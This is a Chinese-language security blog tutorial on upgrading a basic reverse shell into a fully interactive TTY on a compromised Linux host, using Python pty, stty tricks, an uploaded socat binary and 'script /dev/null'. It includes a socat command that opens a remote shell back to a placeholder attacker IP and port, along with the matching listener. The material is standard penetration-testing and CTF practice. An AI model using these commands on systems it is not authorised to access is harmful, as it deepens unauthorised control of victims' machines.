---
title: "拿到基础 Shell 后如何获取完整 Shell"
date: "2025-03-11 19:17:50"
updated: "2026-05-30 19:27:15"
categories: ["文章", "工具资源"]
tags: ["反弹Shell"]
thumbnail: ""
first_image_as_thumbnail: true
excerpt: ""
after_post: ""
comments: true
wp_id: "786"
---
<p class="md-end-block md-p"><span class="md-plain">当通过反弹等方式拿到基础 Shell 后，往往面临无法使用</span><span class="md-pair-s" spellcheck="false"><code>vim</code></span><span class="md-plain">、</span><span class="md-pair-s" spellcheck="false"><code>top</code></span><span class="md-plain">、</span><span class="md-pair-s" spellcheck="false"><code>sudo</code></span><span class="md-plain">等交互命令的问题（因缺乏 tty 环境）。以下是 4 种升级为完整交互 Shell 的核心方法，无需重复描述监听过程，聚焦于拿到 Shell 后的操作：</span></p>

<h3 class="md-end-block md-heading"><span class="md-plain">一、Python pty 快速升级（最常用）</span></h3>
<h4 class="md-end-block md-heading"><span class="md-plain">适用条件</span></h4>
<p class="md-end-block md-p"><span class="md-plain">目标主机已安装 Python（多数 Linux 系统默认预装）。</span></p>

<h4 class="md-end-block md-heading"><span class="md-plain">操作步骤</span></h4>
<p class="md-end-block md-p"><span class="md-plain">在当前基础 Shell 中直接执行：</span></p>



```bash
python -c 'import pty; pty.spawn("/bin/bash")'
```


<h4 class="md-end-block md-heading"><span class="md-plain">效果</span></h4>
<ul class="ul-list" data-mark="-">
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">生成伪终端（pty），可基本支持</span><span class="md-pair-s" spellcheck="false"><code>cd</code></span><span class="md-plain">、</span><span class="md-pair-s" spellcheck="false"><code>ls</code></span><span class="md-plain">等命令的上下文保留；</span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">能使用</span><span class="md-pair-s" spellcheck="false"><code>vim</code></span><span class="md-plain">（部分功能可能异常）和</span><span class="md-pair-s" spellcheck="false"><code>sudo</code></span><span class="md-plain">。</span></p>
</li>
</ul>
<h4 class="md-end-block md-heading"><span class="md-plain">局限性</span></h4>
<ul class="ul-list" data-mark="-">
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">按</span><span class="md-pair-s" spellcheck="false"><code>Ctrl+C</code></span><span class="md-plain">会直接断开连接；</span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">无法通过方向键调用历史命令；</span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s" spellcheck="false"><code>top</code></span><span class="md-plain">等依赖 tty 的命令可能仍报错。</span></p>
</li>
</ul>
<h3 class="md-end-block md-heading"><span class="md-plain">二、nc 环境下的完整 tty 配置（功能最完善）</span></h3>
<h4 class="md-end-block md-heading"><span class="md-plain">适用条件</span></h4>
<p class="md-end-block md-p"><span class="md-plain">攻击机为 Linux 系统，且已通过 nc 拿到基础 Shell。</span></p>

<h4 class="md-end-block md-heading"><span class="md-plain">操作步骤</span></h4>
<ol class="ol-list">
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s"><strong><span class="md-plain">在当前 Shell 中启用 pty</span></strong></span><span class="md-plain">：</span></p>



```bash
python -c 'import pty; pty.spawn("/bin/bash")'  # 若没有python，尝试python3
```


</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s"><strong><span class="md-plain">挂起进程并配置攻击机终端</span></strong></span><span class="md-plain">：</span></p>

<ul class="ul-list" data-mark="-">
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">按</span><span class="md-pair-s" spellcheck="false"><code>Ctrl+Z</code></span><span class="md-plain">将当前 Shell 挂起（回到攻击机本地终端）；</span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">执行以下命令关闭终端回显并恢复进程：</span></p>



```bash
stty raw -echo
fg  # 此时Shell会回到前台，可能需要按Enter确认
```


</li>
</ul>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s "><strong><span class="md-plain">配置环境变量</span></strong></span><span class="md-plain">：</span></p>



```bash
reset  # 刷新终端（可能需要手动输入，看不到回显时直接回车）
export SHELL=bash
export TERM=xterm-256color  # 适配终端颜色和功能
# 根据攻击机终端尺寸设置（示例：行数24，列数80）
stty rows 24 columns 80
```


</li>
</ol>
<h4 class="md-end-block md-heading"><span class="md-plain">效果</span></h4>
<ul class="ul-list" data-mark="-">
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">获得完整 tty 环境，支持</span><span class="md-pair-s" spellcheck="false"><code>vim</code></span><span class="md-plain">、</span><span class="md-pair-s" spellcheck="false"><code>top</code></span><span class="md-plain">、</span><span class="md-pair-s" spellcheck="false"><code>sudo</code></span><span class="md-plain">等所有交互命令；</span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">方向键调用历史命令、</span><span class="md-pair-s" spellcheck="false"><code>Ctrl+C</code></span><span class="md-plain">终止单个命令（不中断连接）均正常。</span></p>
</li>
</ul>
<h3 class="md-end-block md-heading"><span class="md-plain">三、socat 工具实现稳定交互（最稳定）</span></h3>
<h4 class="md-end-block md-heading"><span class="md-plain">适用条件</span></h4>
<p class="md-end-block md-p"><span class="md-plain">目标主机可上传文件或通过 wget 下载工具。</span></p>

<h4 class="md-end-block md-heading"><span class="md-plain">操作步骤</span></h4>
<ol class="ol-list">
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s "><strong><span class="md-plain">上传 socat 到目标机</span></strong></span><span class="md-plain">：</span></p>

<ul class="ul-list" data-mark="-">
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">攻击机下载静态编译版 socat（无需目标机安装依赖）：</span></p>



```bash
wget https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat -O socat
```


</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">通过 WebShell 或基础 Shell 将</span><span class="md-pair-s" spellcheck="false"><code>socat</code></span><span class="md-plain">上传至目标机</span><span class="md-pair-s" spellcheck="false"><code>/tmp</code></span><span class="md-plain">目录，赋予执行权限：</span></p>



```bash
chmod +x /tmp/socat
```


</li>
</ul>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s "><strong><span class="md-plain">在目标机执行升级命令</span></strong></span><span class="md-plain">：</span></p>



```bash
/tmp/socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:攻击机IP:攻击机端口
```


<p class="md-end-block md-p"><span class="md-plain">（攻击机需提前用</span><span class="md-pair-s" spellcheck="false"><code>socat</code></span><span class="md-plain">监听对应端口：</span><span class="md-pair-s" spellcheck="false"><code>socat file:</code></span><span class="md-plain">tty</span><span class="md-pair-s" spellcheck="false"><code>,raw,echo=0 tcp-listen:端口</code></span><span class="md-plain">）</span></p>
</li>
</ol>
<h4 class="md-end-block md-heading"><span class="md-plain">效果</span></h4>
<ul class="ul-list" data-mark="-">
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">稳定性远超 nc，接近 SSH 体验；</span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">支持所有终端功能，</span><span class="md-pair-s" spellcheck="false"><code>Ctrl+C</code></span><span class="md-plain">、后台任务切换（</span><span class="md-pair-s" spellcheck="false"><code>Ctrl+Z</code></span><span class="md-plain">）均正常；</span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">即使网络波动，重连后仍可恢复交互。</span></p>
</li>
</ul>
<h3 class="md-end-block md-heading"><span class="md-plain">四、script 命令应急方案（无依赖）</span></h3>
<h4 class="md-end-block md-heading"><span class="md-plain">适用条件</span></h4>
<p class="md-end-block md-p"><span class="md-plain">目标机无 Python、无法上传工具，但系统自带</span><span class="md-pair-s" spellcheck="false"><code>script</code></span><span class="md-plain">命令（几乎所有 Linux 默认安装）。</span></p>

<h4 class="md-end-block md-heading"><span class="md-plain">操作步骤</span></h4>
<p class="md-end-block md-p md-focus"><span class="md-plain">在当前基础 Shell 中直接执行：</span></p>



```bash
script /dev/null  # 生成指向空设备的pty，避免产生日志文件
```


<h4 class="md-end-block md-heading"><span class="md-plain">效果</span></h4>
<ul class="ul-list" data-mark="-">
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">生成基础 tty 环境，</span><span class="md-pair-s" spellcheck="false"><code>tty</code></span><span class="md-plain">命令会返回</span><span class="md-pair-s" spellcheck="false"><code>/dev/pts/*</code></span><span class="md-plain">（验证成功）；</span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">可使用</span><span class="md-pair-s" spellcheck="false"><code>vim</code></span><span class="md-plain">、</span><span class="md-pair-s" spellcheck="false"><code>top</code></span><span class="md-plain">等命令（功能略逊于完整 tty，但满足应急需求）。</span></p>
</li>
</ul>
<h4 class="md-end-block md-heading"><span class="md-plain">局限性</span></h4>
<ul class="ul-list" data-mark="-">
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">部分终端功能（如历史命令方向键调用）可能异常；</span></p>
</li>
 	<li class="md-list-item md-focus-container">
<p class="md-end-block md-p md-focus"><span class="md-plain md-expand">稳定性一般，复杂操作可能卡顿。</span></p>
</li>
</ul>
